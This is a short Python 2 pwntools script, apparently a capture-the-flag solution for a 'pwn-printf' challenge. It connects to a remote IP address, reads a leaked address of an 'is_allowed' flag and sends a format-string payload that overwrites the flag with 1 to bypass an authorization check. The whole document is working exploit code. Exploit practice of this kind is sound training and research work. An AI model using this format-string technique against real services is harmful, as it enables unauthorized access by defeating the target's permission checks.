#!/usr/bin/env python2

from pwn import *


context.clear(arch='i386')

p = remote('54.89.22.85', 10004)
# p = process('./pwn-printf')
# gdb.attach(p)

addr = p.recvline().strip()

is_allowed = int(addr, 16)

log.info(is_allowed)

writes = {is_allowed: 0x01}

# Empirically determined the offset of 6 into our input
payload = fmtstr_payload(6, writes, write_size='byte')

log.info(hexdump(payload))

p.sendline(payload)

print(p.recvall())

